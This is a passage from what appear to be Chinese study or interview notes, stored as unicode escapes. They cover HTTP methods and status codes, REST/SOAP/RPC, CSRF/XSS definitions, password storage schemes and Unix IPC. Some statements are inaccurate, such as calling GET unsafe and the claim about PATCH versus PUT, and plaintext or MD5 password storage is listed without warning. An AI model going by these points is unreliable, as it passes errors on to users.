\u80fd\u4fdd\u6301\u4f4e\u8d44\u6e90\u4f4e\u6d88\u8017\u9ad8\u6027\u80fd\n* \u914d\u7f6e\u7b80\u6d01\n* \u9ad8\u5ea6\u6a21\u5757\u5316\u7684\u8bbe\u8ba1\uff0c\u7f16\u5199\u6a21\u5757\u76f8\u5bf9\u7b80\u5355\n* \u793e\u533a\u6d3b\u8dc3\n\napache \u76f8\u5bf9nginx \u7684\u4f18\u70b9\uff1a\n* rewrite \uff0c\u6bd4nginx \u7684rewrite \u5f3a\u5927\n* \u6a21\u5757\u8d85\u591a\uff0c\u57fa\u672c\u60f3\u5230\u7684\u90fd\u53ef\u4ee5\u627e\u5230\n* \u5c11bug \uff0cnginx \u7684bug \u76f8\u5bf9\u8f83\u591a\n* \u8d85\u7a33\u5b9a\n\n## 8 \u7f51\u7ad9\u7528\u6237\u5bc6\u7801\u4fdd\u5b58\n\n1. \u660e\u6587\u4fdd\u5b58\n2. \u660e\u6587hash\u540e\u4fdd\u5b58,\u5982md5\n3. MD5+Salt\u65b9\u5f0f,\u8fd9\u4e2asalt\u53ef\u4ee5\u968f\u673a\n4. \u77e5\u4e4e\u4f7f\u7528\u4e86Bcrypy(\u597d\u50cf)\u52a0\u5bc6\n\n## 9 HTTP\u548cHTTPS\n\n\n| \u72b6\u6001\u7801       | \u5b9a\u4e49               |\n| :-------- | :--------------- |\n| 1xx \u62a5\u544a    | \u63a5\u6536\u5230\u8bf7\u6c42\uff0c\u7ee7\u7eed\u8fdb\u7a0b       |\n| 2xx \u6210\u529f    | \u6b65\u9aa4\u6210\u529f\u63a5\u6536\uff0c\u88ab\u7406\u89e3\uff0c\u5e76\u88ab\u63a5\u53d7  |\n| 3xx \u91cd\u5b9a\u5411   | \u4e3a\u4e86\u5b8c\u6210\u8bf7\u6c42,\u5fc5\u987b\u91c7\u53d6\u8fdb\u4e00\u6b65\u63aa\u65bd |\n| 4xx \u5ba2\u6237\u7aef\u51fa\u9519 | \u8bf7\u6c42\u5305\u62ec\u9519\u7684\u987a\u5e8f\u6216\u4e0d\u80fd\u5b8c\u6210    |\n| 5xx \u670d\u52a1\u5668\u51fa\u9519 | \u670d\u52a1\u5668\u65e0\u6cd5\u5b8c\u6210\u663e\u7136\u6709\u6548\u7684\u8bf7\u6c42   |\n\n403: Forbidden\n404: Not Found\n\nHTTPS\u63e1\u624b,\u5bf9\u79f0\u52a0\u5bc6,\u975e\u5bf9\u79f0\u52a0\u5bc6,TLS\/SSL,RSA\n\n## 10 XSRF\u548cXSS\n\n* CSRF(Cross-site request forgery)\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\n* XSS(Cross Site Scripting)\u8de8\u7ad9\u811a\u672c\u653b\u51fb\n\nCSRF\u91cd\u70b9\u5728\u8bf7\u6c42,XSS\u91cd\u70b9\u5728\u811a\u672c\n\n## 11 \u5e42\u7b49 Idempotence\n\nHTTP\u65b9\u6cd5\u7684\u5e42\u7b49\u6027\u662f\u6307\u4e00\u6b21\u548c\u591a\u6b21\u8bf7\u6c42\u67d0\u4e00\u4e2a\u8d44\u6e90\u5e94\u8be5\u5177\u6709\u540c\u6837\u7684**\u526f\u4f5c\u7528**\u3002(\u6ce8\u610f\u662f\u526f\u4f5c\u7528)\n\n`GET http:\/\/www.bank.com\/account\/123456`\uff0c\u4e0d\u4f1a\u6539\u53d8\u8d44\u6e90\u7684\u72b6\u6001\uff0c\u4e0d\u8bba\u8c03\u7528\u4e00\u6b21\u8fd8\u662fN\u6b21\u90fd\u6ca1\u6709\u526f\u4f5c\u7528\u3002\u8bf7\u6ce8\u610f\uff0c\u8fd9\u91cc\u5f3a\u8c03\u7684\u662f\u4e00\u6b21\u548cN\u6b21\u5177\u6709\u76f8\u540c\u7684\u526f\u4f5c\u7528\uff0c\u800c\u4e0d\u662f\u6bcf\u6b21GET\u7684\u7ed3\u679c\u76f8\u540c\u3002`GET http:\/\/www.news.com\/latest-news`\u8fd9\u4e2aHTTP\u8bf7\u6c42\u53ef\u80fd\u4f1a\u6bcf\u6b21\u5f97\u5230\u4e0d\u540c\u7684\u7ed3\u679c\uff0c\u4f46\u5b83\u672c\u8eab\u5e76\u6ca1\u6709\u4ea7\u751f\u4efb\u4f55\u526f\u4f5c\u7528\uff0c\u56e0\u800c\u662f\u6ee1\u8db3\u5e42\u7b49\u6027\u7684\u3002\n\nDELETE\u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u8d44\u6e90\uff0c\u6709\u526f\u4f5c\u7528\uff0c\u4f46\u5b83\u5e94\u8be5\u6ee1\u8db3\u5e42\u7b49\u6027\u3002\u6bd4\u5982\uff1a`DELETE http:\/\/www.forum.com\/article\/4231`\uff0c\u8c03\u7528\u4e00\u6b21\u548cN\u6b21\u5bf9\u7cfb\u7edf\u4ea7\u751f\u7684\u526f\u4f5c\u7528\u662f\u76f8\u540c\u7684\uff0c\u5373\u5220\u6389id\u4e3a4231\u7684\u5e16\u5b50\uff1b\u56e0\u6b64\uff0c\u8c03\u7528\u8005\u53ef\u4ee5\u591a\u6b21\u8c03\u7528\u6216\u5237\u65b0\u9875\u9762\u800c\u4e0d\u5fc5\u62c5\u5fc3\u5f15\u8d77\u9519\u8bef\u3002\n\n\nPOST\u6240\u5bf9\u5e94\u7684URI\u5e76\u975e\u521b\u5efa\u7684\u8d44\u6e90\u672c\u8eab\uff0c\u800c\u662f\u8d44\u6e90\u7684\u63a5\u6536\u8005\u3002\u6bd4\u5982\uff1a`POST http:\/\/www.forum.com\/articles`\u7684\u8bed\u4e49\u662f\u5728`http:\/\/www.forum.com\/articles`\u4e0b\u521b\u5efa\u4e00\u7bc7\u5e16\u5b50\uff0cHTTP\u54cd\u5e94\u4e2d\u5e94\u5305\u542b\u5e16\u5b50\u7684\u521b\u5efa\u72b6\u6001\u4ee5\u53ca\u5e16\u5b50\u7684URI\u3002\u4e24\u6b21\u76f8\u540c\u7684POST\u8bf7\u6c42\u4f1a\u5728\u670d\u52a1\u5668\u7aef\u521b\u5efa\u4e24\u4efd\u8d44\u6e90\uff0c\u5b83\u4eec\u5177\u6709\u4e0d\u540c\u7684URI\uff1b\u6240\u4ee5\uff0cPOST\u65b9\u6cd5\u4e0d\u5177\u5907\u5e42\u7b49\u6027\u3002\n\nPUT\u6240\u5bf9\u5e94\u7684URI\u662f\u8981\u521b\u5efa\u6216\u66f4\u65b0\u7684\u8d44\u6e90\u672c\u8eab\u3002\u6bd4\u5982\uff1a`PUT http:\/\/www.forum\/articles\/4231`\u7684\u8bed\u4e49\u662f\u521b\u5efa\u6216\u66f4\u65b0ID\u4e3a4231\u7684\u5e16\u5b50\u3002\u5bf9\u540c\u4e00URI\u8fdb\u884c\u591a\u6b21PUT\u7684\u526f\u4f5c\u7528\u548c\u4e00\u6b21PUT\u662f\u76f8\u540c\u7684\uff1b\u56e0\u6b64\uff0cPUT\u65b9\u6cd5\u5177\u6709\u5e42\u7b49\u6027\u3002\n\n\n## 12 RESTful\u67b6\u6784(SOAP,RPC)\n\n\u63a8\u8350: http:\/\/www.ruanyifeng.com\/blog\/2011\/09\/restful.html\n\n\n## 13 SOAP\n\nSOAP\uff08\u539f\u4e3aSimple Object Access Protocol\u7684\u9996\u5b57\u6bcd\u7f29\u5199\uff0c\u5373\u7b80\u5355\u5bf9\u8c61\u8bbf\u95ee\u534f\u8bae\uff09\u662f\u4ea4\u6362\u6570\u636e\u7684\u4e00\u79cd\u534f\u8bae\u89c4\u8303\uff0c\u4f7f\u7528\u5728\u8ba1\u7b97\u673a\u7f51\u7edcWeb\u670d\u52a1\uff08web service\uff09\u4e2d\uff0c\u4ea4\u6362\u5e26\u7ed3\u6784\u4fe1\u606f\u3002SOAP\u4e3a\u4e86\u7b80\u5316\u7f51\u9875\u670d\u52a1\u5668\uff08Web Server\uff09\u4eceXML\u6570\u636e\u5e93\u4e2d\u63d0\u53d6\u6570\u636e\u65f6\uff0c\u8282\u7701\u53bb\u683c\u5f0f\u5316\u9875\u9762\u65f6\u95f4\uff0c\u4ee5\u53ca\u4e0d\u540c\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u6309\u7167HTTP\u901a\u4fe1\u534f\u8bae\uff0c\u9075\u4eceXML\u683c\u5f0f\u6267\u884c\u8d44\u6599\u4e92\u6362\uff0c\u4f7f\u5176\u62bd\u8c61\u4e8e\u8bed\u8a00\u5b9e\u73b0\u3001\u5e73\u53f0\u548c\u786c\u4ef6\u3002\n\n## 14 RPC\n\nRPC\uff08Remote Procedure Call Protocol\uff09\u2014\u2014\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u534f\u8bae\uff0c\u5b83\u662f\u4e00\u79cd\u901a\u8fc7\u7f51\u7edc\u4ece\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7a0b\u5e8f\u4e0a\u8bf7\u6c42\u670d\u52a1\uff0c\u800c\u4e0d\u9700\u8981\u4e86\u89e3\u5e95\u5c42\u7f51\u7edc\u6280\u672f\u7684\u534f\u8bae\u3002RPC\u534f\u8bae\u5047\u5b9a\u67d0\u4e9b\u4f20\u8f93\u534f\u8bae\u7684\u5b58\u5728\uff0c\u5982TCP\u6216UDP\uff0c\u4e3a\u901a\u4fe1\u7a0b\u5e8f\u4e4b\u95f4\u643a\u5e26\u4fe1\u606f\u6570\u636e\u3002\u5728OSI\u7f51\u7edc\u901a\u4fe1\u6a21\u578b\u4e2d\uff0cRPC\u8de8\u8d8a\u4e86\u4f20\u8f93\u5c42\u548c\u5e94\u7528\u5c42\u3002RPC\u4f7f\u5f97\u5f00\u53d1\u5305\u62ec\u7f51\u7edc\u5206\u5e03\u5f0f\u591a\u7a0b\u5e8f\u5728\u5185\u7684\u5e94\u7528\u7a0b\u5e8f\u66f4\u52a0\u5bb9\u6613\u3002\n\n\u603b\u7ed3:\u670d\u52a1\u63d0\u4f9b\u7684\u4e24\u5927\u6d41\u6d3e.\u4f20\u7edf\u610f\u4e49\u4ee5\u65b9\u6cd5\u8c03\u7528\u4e3a\u5bfc\u5411\u901a\u79f0RPC\u3002\u4e3a\u4e86\u4f01\u4e1aSOA,\u82e5\u5e72\u5382\u5546\u8054\u5408\u63a8\u51fawebservice,\u5236\u5b9a\u4e86wsdl\u63a5\u53e3\u5b9a\u4e49,\u4f20\u8f93soap.\u5f53\u4e92\u8054\u7f51\u65f6\u4ee3,\u81c3\u80bfSOA\u88ab\u7b80\u5316\u4e3ahttp+xml\/json.\u4f46\u662f\u7b80\u5316\u51fa\u73b0\u5404\u79cd\u6df7\u4e71\u3002\u4ee5\u8d44\u6e90\u4e3a\u5bfc\u5411,\u4efb\u4f55\u64cd\u4f5c\u65e0\u975e\u662f\u5bf9\u8d44\u6e90\u7684\u589e\u5220\u6539\u67e5\uff0c\u4e8e\u662f\u7edf\u4e00\u7684REST\u51fa\u73b0\u4e86.\n\n\u8fdb\u5316\u7684\u987a\u5e8f: RPC -> SOAP -> RESTful\n\n## 15 CGI\u548cWSGI\nCGI\u662f\u901a\u7528\u7f51\u5173\u63a5\u53e3\uff0c\u662f\u8fde\u63a5web\u670d\u52a1\u5668\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u63a5\u53e3\uff0c\u7528\u6237\u901a\u8fc7CGI\u6765\u83b7\u53d6\u52a8\u6001\u6570\u636e\u6216\u6587\u4ef6\u7b49\u3002\nCGI\u7a0b\u5e8f\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u7a0b\u5e8f\uff0c\u5b83\u53ef\u4ee5\u7528\u51e0\u4e4e\u6240\u6709\u8bed\u8a00\u6765\u5199\uff0c\u5305\u62ecperl\uff0cc\uff0clua\uff0cpython\u7b49\u7b49\u3002\n\nWSGI, Web Server Gateway Interface\uff0c\u662fPython\u5e94\u7528\u7a0b\u5e8f\u6216\u6846\u67b6\u548cWeb\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u4e00\u79cd\u63a5\u53e3\uff0cWSGI\u7684\u5176\u4e2d\u4e00\u4e2a\u76ee\u7684\u5c31\u662f\u8ba9\u7528\u6237\u53ef\u4ee5\u7528\u7edf\u4e00\u7684\u8bed\u8a00(Python)\u7f16\u5199\u524d\u540e\u7aef\u3002\n\n\u5b98\u65b9\u8bf4\u660e\uff1a[PEP-3333](https:\/\/www.python.org\/dev\/peps\/pep-3333\/)\n\n## 16 \u4e2d\u95f4\u4eba\u653b\u51fb\n\n\u5728GFW\u91cc\u5c61\u89c1\u4e0d\u9c9c\u7684,\u5475\u5475.\n\n\u4e2d\u95f4\u4eba\u653b\u51fb\uff08Man-in-the-middle attack\uff0c\u901a\u5e38\u7f29\u5199\u4e3aMITM\uff09\u662f\u6307\u653b\u51fb\u8005\u4e0e\u901a\u8baf\u7684\u4e24\u7aef\u5206\u522b\u521b\u5efa\u72ec\u7acb\u7684\u8054\u7cfb\uff0c\u5e76\u4ea4\u6362\u5176\u6240\u6536\u5230\u7684\u6570\u636e\uff0c\u4f7f\u901a\u8baf\u7684\u4e24\u7aef\u8ba4\u4e3a\u4ed6\u4eec\u6b63\u5728\u901a\u8fc7\u4e00\u4e2a\u79c1\u5bc6\u7684\u8fde\u63a5\u4e0e\u5bf9\u65b9\u76f4\u63a5\u5bf9\u8bdd\uff0c\u4f46\u4e8b\u5b9e\u4e0a\u6574\u4e2a\u4f1a\u8bdd\u90fd\u88ab\u653b\u51fb\u8005\u5b8c\u5168\u63a7\u5236\u3002\n\n## 17 c10k\u95ee\u9898\n\n\u6240\u8c13c10k\u95ee\u9898\uff0c\u6307\u7684\u662f\u670d\u52a1\u5668\u540c\u65f6\u652f\u6301\u6210\u5343\u4e0a\u4e07\u4e2a\u5ba2\u6237\u7aef\u7684\u95ee\u9898\uff0c\u4e5f\u5c31\u662fconcurrent 10 000 connection\uff08\u8fd9\u4e5f\u662fc10k\u8fd9\u4e2a\u540d\u5b57\u7684\u7531\u6765\uff09\u3002\n\u63a8\u8350: https:\/\/my.oschina.net\/xianggao\/blog\/664275\n\n## 18 socket\n\n\u63a8\u8350: http:\/\/www.360doc.com\/content\/11\/0609\/15\/5482098_122692444.shtml\n\nSocket=Ip address+ TCP\/UDP + port\n\n## 19 \u6d4f\u89c8\u5668\u7f13\u5b58\n\n\u63a8\u8350: http:\/\/www.cnblogs.com\/skynet\/archive\/2012\/11\/28\/2792503.html\n\n304 Not Modified\n\n## 20 HTTP1.0\u548cHTTP1.1\n\n\u63a8\u8350: http:\/\/blog.csdn.net\/elifefly\/article\/details\/3964766\n\n1. \u8bf7\u6c42\u5934Host\u5b57\u6bb5,\u4e00\u4e2a\u670d\u52a1\u5668\u591a\u4e2a\u7f51\u7ad9\n2. \u957f\u94fe\u63a5\n3. \u6587\u4ef6\u65ad\u70b9\u7eed\u4f20\n4. \u8eab\u4efd\u8ba4\u8bc1,\u72b6\u6001\u7ba1\u7406,Cache\u7f13\u5b58\n\nHTTP\u8bf7\u6c428\u79cd\u65b9\u6cd5\u4ecb\u7ecd \nHTTP\/1.1\u534f\u8bae\u4e2d\u5171\u5b9a\u4e49\u4e868\u79cdHTTP\u8bf7\u6c42\u65b9\u6cd5\uff0cHTTP\u8bf7\u6c42\u65b9\u6cd5\u4e5f\u88ab\u53eb\u505a\u201c\u8bf7\u6c42\u52a8\u4f5c\u201d\uff0c\u4e0d\u540c\u7684\u65b9\u6cd5\u89c4\u5b9a\u4e86\u4e0d\u540c\u7684\u64cd\u4f5c\u6307\u5b9a\u7684\u8d44\u6e90\u65b9\u5f0f\u3002\u670d\u52a1\u7aef\u4e5f\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u8bf7\u6c42\u65b9\u6cd5\u505a\u4e0d\u540c\u7684\u54cd\u5e94\u3002\n\nGET\n\nGET\u8bf7\u6c42\u4f1a\u663e\u793a\u8bf7\u6c42\u6307\u5b9a\u7684\u8d44\u6e90\u3002\u4e00\u822c\u6765\u8bf4GET\u65b9\u6cd5\u5e94\u8be5\u53ea\u7528\u4e8e\u6570\u636e\u7684\u8bfb\u53d6\uff0c\u800c\u4e0d\u5e94\u5f53\u7528\u4e8e\u4f1a\u4ea7\u751f\u526f\u4f5c\u7528\u7684\u975e\u5e42\u7b49\u7684\u64cd\u4f5c\u4e2d\u3002\n\nGET\u4f1a\u65b9\u6cd5\u8bf7\u6c42\u6307\u5b9a\u7684\u9875\u9762\u4fe1\u606f\uff0c\u5e76\u8fd4\u56de\u54cd\u5e94\u4e3b\u4f53\uff0cGET\u88ab\u8ba4\u4e3a\u662f\u4e0d\u5b89\u5168\u7684\u65b9\u6cd5\uff0c\u56e0\u4e3aGET\u65b9\u6cd5\u4f1a\u88ab\u7f51\u7edc\u8718\u86db\u7b49\u4efb\u610f\u7684\u8bbf\u95ee\u3002\n\nHEAD\n\nHEAD\u65b9\u6cd5\u4e0eGET\u65b9\u6cd5\u4e00\u6837\uff0c\u90fd\u662f\u5411\u670d\u52a1\u5668\u53d1\u51fa\u6307\u5b9a\u8d44\u6e90\u7684\u8bf7\u6c42\u3002\u4f46\u662f\uff0c\u670d\u52a1\u5668\u5728\u54cd\u5e94HEAD\u8bf7\u6c42\u65f6\u4e0d\u4f1a\u56de\u4f20\u8d44\u6e90\u7684\u5185\u5bb9\u90e8\u5206\uff0c\u5373\uff1a\u54cd\u5e94\u4e3b\u4f53\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0d\u4f20\u8f93\u5168\u90e8\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6\u670d\u52a1\u5668\u7684\u54cd\u5e94\u5934\u4fe1\u606f\u3002HEAD\u65b9\u6cd5\u5e38\u88ab\u7528\u4e8e\u5ba2\u6237\u7aef\u67e5\u770b\u670d\u52a1\u5668\u7684\u6027\u80fd\u3002\n\nPOST\n\nPOST\u8bf7\u6c42\u4f1a \u5411\u6307\u5b9a\u8d44\u6e90\u63d0\u4ea4\u6570\u636e\uff0c\u8bf7\u6c42\u670d\u52a1\u5668\u8fdb\u884c\u5904\u7406\uff0c\u5982\uff1a\u8868\u5355\u6570\u636e\u63d0\u4ea4\u3001\u6587\u4ef6\u4e0a\u4f20\u7b49\uff0c\u8bf7\u6c42\u6570\u636e\u4f1a\u88ab\u5305\u542b\u5728\u8bf7\u6c42\u4f53\u4e2d\u3002POST\u65b9\u6cd5\u662f\u975e\u5e42\u7b49\u7684\u65b9\u6cd5\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u8bf7\u6c42\u53ef\u80fd\u4f1a\u521b\u5efa\u65b0\u7684\u8d44\u6e90\u6216\/\u548c\u4fee\u6539\u73b0\u6709\u8d44\u6e90\u3002\n\nPUT\n\nPUT\u8bf7\u6c42\u4f1a\u8eab\u5411\u6307\u5b9a\u8d44\u6e90\u4f4d\u7f6e\u4e0a\u4f20\u5176\u6700\u65b0\u5185\u5bb9\uff0cPUT\u65b9\u6cd5\u662f\u5e42\u7b49\u7684\u65b9\u6cd5\u3002\u901a\u8fc7\u8be5\u65b9\u6cd5\u5ba2\u6237\u7aef\u53ef\u4ee5\u5c06\u6307\u5b9a\u8d44\u6e90\u7684\u6700\u65b0\u6570\u636e\u4f20\u9001\u7ed9\u670d\u52a1\u5668\u53d6\u4ee3\u6307\u5b9a\u7684\u8d44\u6e90\u7684\u5185\u5bb9\u3002\n\nDELETE\n\nDELETE\u8bf7\u6c42\u7528\u4e8e\u8bf7\u6c42\u670d\u52a1\u5668\u5220\u9664\u6240\u8bf7\u6c42URI\uff08\u7edf\u4e00\u8d44\u6e90\u6807\u8bc6\u7b26\uff0cUniform Resource Identifier\uff09\u6240\u6807\u8bc6\u7684\u8d44\u6e90\u3002DELETE\u8bf7\u6c42\u540e\u6307\u5b9a\u8d44\u6e90\u4f1a\u88ab\u5220\u9664\uff0cDELETE\u65b9\u6cd5\u4e5f\u662f\u5e42\u7b49\u7684\u3002\n\nCONNECT\n\nCONNECT\u65b9\u6cd5\u662fHTTP\/1.1\u534f\u8bae\u9884\u7559\u7684\uff0c\u80fd\u591f\u5c06\u8fde\u63a5\u6539\u4e3a\u7ba1\u9053\u65b9\u5f0f\u7684\u4ee3\u7406\u670d\u52a1\u5668\u3002\u901a\u5e38\u7528\u4e8eSSL\u52a0\u5bc6\u670d\u52a1\u5668\u7684\u94fe\u63a5\u4e0e\u975e\u52a0\u5bc6\u7684HTTP\u4ee3\u7406\u670d\u52a1\u5668\u7684\u901a\u4fe1\u3002\n\nOPTIONS\n\nOPTIONS\u8bf7\u6c42\u4e0eHEAD\u7c7b\u4f3c\uff0c\u4e00\u822c\u4e5f\u662f\u7528\u4e8e\u5ba2\u6237\u7aef\u67e5\u770b\u670d\u52a1\u5668\u7684\u6027\u80fd\u3002 \u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u8bf7\u6c42\u670d\u52a1\u5668\u8fd4\u56de\u8be5\u8d44\u6e90\u6240\u652f\u6301\u7684\u6240\u6709HTTP\u8bf7\u6c42\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u4f1a\u7528\u2019*\u2019\u6765\u4ee3\u66ff\u8d44\u6e90\u540d\u79f0\uff0c\u5411\u670d\u52a1\u5668\u53d1\u9001OPTIONS\u8bf7\u6c42\uff0c\u53ef\u4ee5\u6d4b\u8bd5\u670d\u52a1\u5668\u529f\u80fd\u662f\u5426\u6b63\u5e38\u3002JavaScript\u7684XMLHttpRequest\u5bf9\u8c61\u8fdb\u884cCORS\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u65f6\uff0c\u5c31\u662f\u4f7f\u7528OPTIONS\u65b9\u6cd5\u53d1\u9001\u55c5\u63a2\u8bf7\u6c42\uff0c\u4ee5\u5224\u65ad\u662f\u5426\u6709\u5bf9\u6307\u5b9a\u8d44\u6e90\u7684\u8bbf\u95ee\u6743\u9650\u3002 \u5141\u8bb8\n\nTRACE\n\nTRACE\u8bf7\u6c42\u670d\u52a1\u5668\u56de\u663e\u5176\u6536\u5230\u7684\u8bf7\u6c42\u4fe1\u606f\uff0c\u8be5\u65b9\u6cd5\u4e3b\u8981\u7528\u4e8eHTTP\u8bf7\u6c42\u7684\u6d4b\u8bd5\u6216\u8bca\u65ad\u3002\n\nHTTP\/1.1\u4e4b\u540e\u589e\u52a0\u7684\u65b9\u6cd5\n\n\u5728HTTP\/1.1\u6807\u51c6\u5236\u5b9a\u4e4b\u540e\uff0c\u53c8\u9646\u7eed\u6269\u5c55\u4e86\u4e00\u4e9b\u65b9\u6cd5\u3002\u5176\u4e2d\u4f7f\u7528\u4e2d\u8f83\u591a\u7684\u662f PATCH \u65b9\u6cd5\uff1a\n\nPATCH\n\nPATCH\u65b9\u6cd5\u51fa\u73b0\u7684\u8f83\u665a\uff0c\u5b83\u57282010\u5e74\u7684RFC 5789\u6807\u51c6\u4e2d\u88ab\u5b9a\u4e49\u3002PATCH\u8bf7\u6c42\u4e0ePUT\u8bf7\u6c42\u7c7b\u4f3c\uff0c\u540c\u6837\u7528\u4e8e\u8d44\u6e90\u7684\u66f4\u65b0\u3002\u4e8c\u8005\u6709\u4ee5\u4e0b\u4e24\u70b9\u4e0d\u540c\uff1a\n\n\u4f46PATCH\u4e00\u822c\u7528\u4e8e\u8d44\u6e90\u7684\u90e8\u5206\u66f4\u65b0\uff0c\u800cPUT\u4e00\u822c\u7528\u4e8e\u8d44\u6e90\u7684\u6574\u4f53\u66f4\u65b0\u3002 \n\u5f53\u8d44\u6e90\u4e0d\u5b58\u5728\u65f6\uff0cPATCH\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8d44\u6e90\uff0c\u800cPUT\u53ea\u4f1a\u5bf9\u5df2\u5728\u8d44\u6e90\u8fdb\u884c\u66f4\u65b0\u3002\n\n## 21 Ajax\nAJAX,Asynchronous JavaScript and XML\uff08\u5f02\u6b65\u7684 JavaScript \u548c XML\uff09, \u662f\u4e0e\u5728\u4e0d\u91cd\u65b0\u52a0\u8f7d\u6574\u4e2a\u9875\u9762\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0e\u670d\u52a1\u5668\u4ea4\u6362\u6570\u636e\u5e76\u66f4\u65b0\u90e8\u5206\u7f51\u9875\u7684\u6280\u672f\u3002\n\n# *NIX\n\n## unix\u8fdb\u7a0b\u95f4\u901a\u4fe1\u65b9\u5f0f(IPC)\n\n1. \u7ba1\u9053\uff08Pipe\uff09\uff1a\u7ba1\u9053\u53ef\u7528\u4e8e\u5177\u6709\u4eb2\u7f18\u5173\u7cfb\u8fdb\u7a0b\u95f4\u7684\u901a\u4fe1\uff0c\u5141\u8bb8\u4e00\u4e2a\u8fdb\u7a0b\u548c\u53e6\u4e00\u4e2a\u4e0e\u5b83\u6709\u5171\u540c\u7956\u5148\u7684\u8fdb\u7a0b\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u3002\n2. \u547d\u540d\u7ba1\u9053\uff08named pipe\uff09\uff1a\u547d\u540d\u7ba1\u9053\u514b\u670d\u4e86\u7ba1\u9053\u6ca1\u6709\u540d\u5b57\u7684\u9650\u5236\uff0c\u56e0\u6b64\uff0c\u9664\u5177\u6709\u7ba1\u9053\u6240\u5177\u6709\u7684\u529f\u80fd\u5916\uff0c\u5b83\u8fd8\u5141\u8bb8\u65e0\u4eb2\u7f18\u5173\u7cfb\u8fdb\u7a0b\u95f4\u7684\u901a\u4fe1\u3002\u547d\u540d\u7ba1\u9053\u5728\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6709\u5bf9\u5e94\u7684\u6587\u4ef6\u540d\u3002\u547d\u540d\u7ba1\u9053\u901a\u8fc7\u547d\u4ee4mkfifo\u6216\u7cfb\u7edf\u8c03\u7528mkfifo\u6765\u521b\u5efa\u3002\n3. \u4fe1\u53f7\uff08Signal\uff09\uff1a\u4fe1\u53f7\u662f\u6bd4\u8f83\u590d\u6742\u7684\u901a\u4fe1\u65b9\u5f0f\uff0c\u7528\u4e8e\u901a\u77e5\u63a5\u53d7\u8fdb\u7a0b\u6709\u67d0\u79cd\u4e8b\u4ef6\u53d1\u751f\uff0c\u9664\u4e86\u7528\u4e8e\u8fdb\u7a0b\u95f4\u901a\u4fe1\u5916\uff0c\u8fdb\u7a0b\u8fd8\u53ef\u4ee5\u53d1\u9001\u4fe1\u53f7\u7ed9\u8fdb\u7a0b\u672c\u8eab\uff1blinux\u9664\u4e86\u652f\u6301Unix\u65e9\u671f\u4fe1\u53f7\u8bed\u4e49\u51fd\u6570sigal\u5916\uff0c\u8fd8\u652f\u6301\u8bed\u4e49\u7b26\u5408Posix.1\u6807\u51c6\u7684\u4fe1\u53f7\u51fd\u6570sigaction\uff08\u5b9e\u9645\u4e0a\uff0c\u8be5\u51fd\u6570\u662f\u57fa\u4e8eBSD\u7684\uff0cBSD\u4e3a\u4e86\u5b9e\u73b0\u53ef\u9760\u4fe1\u53f7\u673a\u5236\uff0c\u53c8\u80fd\u591f\u7edf\u4e00\u5bf9\u5916\u63a5\u53e3\uff0c\u7528sigaction\u51fd\u6570\u91cd\u65b0\u5b9e\u73b0\u4e86signal\u51fd\u6570\uff09\u3002\n4. \u6d88\u606f\uff08Message\uff09\u961f\u5217\uff1a\u6d88\u606f\u961f\u5217\u662f\u6d88\u606f\u7684\u94fe\u63a5\u8868\uff0c\u5305\u62ecPosix\u6d88\u606f\u961f\u5217system V\u6d88\u606f\u961f\u5217\u3002\u6709\u8db3\u591f\u6743\u9650\u7684\u8fdb\u7a0b\u53ef\u4ee5\u5411\u961f\u5217\u4e2d\u6dfb\u52a0\u6d88\u606f\uff0c\u88ab\u8d4b\u4e88\u8bfb\u6743\u9650\u7684\u8fdb\u7a0b\u5219\u53ef\u4ee5\u8bfb\u8d70\u961f\u5217\u4e2d\u7684\u6d88\u606f\u3002\u6d88\u606f\u961f\u5217\u514b\u670d\u4e86\u4fe1\u53f7\u627f\u8f7d\u4fe1\u606f\u91cf\u5c11\uff0c\u7ba1\u9053\u53ea\u80fd\u627f\u8f7d\u65e0\u683c\u5f0f\u5b57\u8282\u6d41\u4ee5\u53ca\u7f13\u51b2\u533a\u5927\u5c0f\u53d7\u9650\u7b49\u7f3a\n5. \u5171\u4eab\u5185\u5b58\uff1a\u4f7f\u5f97\u591a\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u5757\u5185\u5b58\u7a7a\u95f4\uff0c\u662f\u6700\u5feb\u7684\u53ef\u7528IPC\u5f62\u5f0f\u3002\u662f\u9488\u5bf9\u5176\u4ed6\u901a\u4fe1\u673a\u5236\u8fd0\u884c\u6548\u7387\u8f83\u4f4e\u800c\u8bbe\u8ba1\u7684\u3002\u5f80\u5f80\u4e0e\u5176\u5b83\u901a\u4fe1\u673a\u5236\uff0c\u5982\u4fe1\u53f7\u91cf\u7ed3\u5408\u4f7f\u7528\uff0c\u6765\u8fbe\u5230\u8fdb\u7a0b\u95f4\u7684\u540c\u6b65\u53ca\u4e92\u65a5\u3002\n6. \u5185\u5b58\u6620\u5c04\uff08mapped memory\uff09\uff1a\u5185\u5b58\u6620\u5c04\u5141\u8bb8\u4efb\u4f55\u591a\u4e2a\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff0c\u6bcf\u4e00\u4e2a\u4f7f\u7528\u8be5\u673a\u5236\u7684\u8fdb\u7a0b\u901a\u8fc7\u628a\u4e00\u4e2a\u5171\u4eab\u7684\u6587\u4ef6\u6620\u5c04\u5230\u81ea\u5df1\u7684\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u6765\u5b9e\u73b0\u5b83\u3002\n7. 